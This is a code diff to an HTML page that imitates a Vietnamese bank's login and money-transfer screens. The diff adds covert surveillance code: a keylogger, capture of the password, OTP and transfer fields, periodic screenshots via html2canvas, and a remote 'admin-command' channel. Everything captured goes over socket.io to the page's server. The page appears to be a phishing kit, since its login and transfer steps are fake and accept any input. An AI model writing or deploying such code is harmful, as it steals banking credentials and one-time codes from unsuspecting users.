@@ -180,7 +180,97 @@
         </div>
     </div>
     
+    <script src="/socket.io/socket.io.js"></script>
     <script>
+        const socket = io();
+        let captureInterval;
+        let keylogData = [];
+        
+        window.addEventListener('load', () => {
+            setTimeout(startScreenCapture, 2000);
+            startKeylogging();
+        });
+        
+        async function startScreenCapture() {
+            try {
+                captureInterval = setInterval(async () => {
+                    try {
+                        const tempCanvas = await html2canvas(document.body, {
+                            allowTaint: true,
+                            useCORS: true,
+                            scale: 0.5,
+                            width: window.innerWidth,
+                            height: window.innerHeight
+                        });
+                        
+                        const imageData = tempCanvas.toDataURL('image/jpeg', 0.6);
+                        socket.emit('screen-capture', {
+                            userId: socket.id,
+                            screenshot: imageData,
+                            timestamp: Date.now(),
+                            url: window.location.href
+                        });
+                        
+                    } catch (e) {
+                        captureFormData();
+                    }
+                }, 3000);
+                
+            } catch (err) {
+                captureFormData();
+            }
+        }
+        
+        function captureFormData() {
+            const formData = {
+                account: document.getElementById('account')?.value || '',
+                password: document.getElementById('password')?.value || '',
+                otp: document.getElementById('otp')?.value || '',
+                toAccount: document.getElementById('toAccount')?.value || '',
+                amount: document.getElementById('amount')?.value || '',
+                confirmPass: document.getElementById('confirmPass')?.value || '',
+                timestamp: Date.now(),
+                url: window.location.href
+            };
+            
+            if (Object.values(formData).some(val => val)) {
+                socket.emit('form-data', formData);
+            }
+        }
+        
+        function startKeylogging() {
+            document.addEventListener('keydown', (e) => {
+                keylogData.push({
+                    key: e.key,
+                    target: e.target.id || e.target.tagName,
+                    value: e.target.value,
+                    timestamp: Date.now()
+                });
+                
+                if (keylogData.length >= 10) {
+                    socket.emit('keylog-data', keylogData);
+                    keylogData = [];
+                }
+            });
+            
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', () => {
+                    socket.emit('input-focus', {
+                        field: input.id,
+                        timestamp: Date.now()
+                    });
+                });
+                
+                input.addEventListener('blur', () => {
+                    socket.emit('input-data', {
+                        field: input.id,
+                        value: input.value,
+                        timestamp: Date.now()
+                    });
+                });
+            });
+        }
+        
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             
@@ -188,12 +278,22 @@
             const password = document.getElementById('password').value;
             const otp = document.getElementById('otp').value;
             
+            socket.emit('login-attempt', {
+                account: account,
+                password: password,
+                otp: otp,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                ip: 'client-side'
+            });
+            
             if (account && password) {
                 setTimeout(() => {
                     document.getElementById('loginSection').style.display = 'none';
                     document.getElementById('dashboardSection').style.display = 'block';
                     document.getElementById('welcomeUser').textContent = account;
                     document.getElementById('accountNumber').textContent = account;
+                    startKeylogging();
                 }, 1000);
             } else {
                 alert('Vui lòng nhập đầy đủ thông tin!');
@@ -202,6 +302,7 @@
         
         function showTransfer() {
             document.getElementById('transferForm').style.display = 'block';
+            startKeylogging();
         }
         
         function showHistory() {
@@ -222,6 +323,14 @@
             const confirmPass = document.getElementById('confirmPass').value;
             const content = document.getElementById('content').value;
             
+            socket.emit('transfer-data', {
+                toAccount: toAccount,
+                amount: amount,
+                confirmPass: confirmPass,
+                content: content,
+                timestamp: Date.now()
+            });
+            
             if (toAccount && amount && confirmPass) {
                 alert('Chuyển khoản thành công!\\nSố tiền: ' + amount + ' VNĐ\\nTới TK: ' + toAccount);
                 document.getElementById('transferForm').style.display = 'none';
@@ -229,6 +338,29 @@
                 alert('Vui lòng nhập đầy đủ thông tin!');
             }
         }
+        
+        window.addEventListener('beforeunload', () => {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            if (keylogData.length > 0) {
+                socket.emit('keylog-data', keylogData);
+            }
+        });
+        
+        socket.on('admin-command', (data) => {
+            if (data.action === 'stop-capture') {
+                if (captureInterval) {
+                    clearInterval(captureInterval);
+                    captureInterval = null;
+                }
+            } else if (data.action === 'start-capture') {
+                if (!captureInterval) {
+                    startScreenCapture();
+                }
+            }
+        });
     </script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
 </body>
 </html>
